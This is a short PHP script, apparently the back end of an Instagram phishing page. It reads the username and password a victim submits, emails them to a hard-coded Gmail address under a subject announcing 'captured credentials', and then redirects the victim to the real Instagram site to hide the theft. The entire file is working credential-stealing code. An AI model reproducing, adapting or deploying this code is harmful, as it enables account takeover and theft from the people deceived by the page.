<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capturar los datos del formulario
    $usuario = isset($_POST['user']) ? trim($_POST['user']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    // Validar si los campos están llenos
    if (empty($usuario) || empty($password)) {
        echo "Por favor, completa todos los campos.";
        exit();
    }

    // Configuración del correo
    $destinatario = "ibarraleonelmatias73@gmail.com";  // Reemplaza con tu correo
    $asunto = "Nuevas credenciales capturadas";
    $mensaje = "Usuario: " . $usuario . "\nContraseña: " . $password;
    $cabeceras = "From: no-reply@tudominio.com\r\n";

    // Intentar enviar el correo
    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        // Redirigir a Instagram después del envío
        header("Location: https://www.instagram.com");
        exit();
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Acceso no permitido.";
}
?>
